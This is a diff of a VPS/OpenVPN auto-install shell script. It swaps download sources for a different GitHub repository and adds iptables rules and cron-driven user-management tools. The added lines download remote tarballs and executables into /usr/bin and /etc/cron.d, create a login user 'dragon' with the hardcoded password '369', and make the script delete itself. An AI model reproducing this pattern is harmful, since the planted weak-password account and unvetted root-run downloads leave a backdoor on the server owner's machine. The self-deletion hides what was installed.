@@ -164,27 +164,22 @@ wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/kingmapual
 # openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/openvpn.tar"
-tar xf openvpn.tar;rm openvpn.tar
-#curl -O https://raw.githubusercontent.com/Angristan/openvpn-install/master/openvpn-install.sh
-#chmod +x openvpn-install.sh
-#./openvpn-install.sh
-wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
-chmod +x /etc/rc.local
-
+wget https://raw.githubusercontent.com/macisvpn/randomVPS/master/v/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/macisvpn/randomVPS/master/v/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
 # etc
-#cp /root/client.ovpn /home/vps/public_html
-#wget -O /home/vps/public_html/client.ovpn /root/client.ovpn
-wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/client.ovpn"
-wget -O /home/vps/public_html/client1.ovpn "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/client1.ovpn"
-wget -O /etc/motd "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/motd"
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/macisvpn/randomVPS/master/v/client.ovpn"
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
-#useradd -m -g users -s /bin/bash test
-#echo "test:test" | chpasswd
+cd;wget https://raw.githubusercontent.com/macisvpn/randomVPS/master/v/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash dragon
+echo "dragon:369" | chpasswd
 echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 clear
 
 
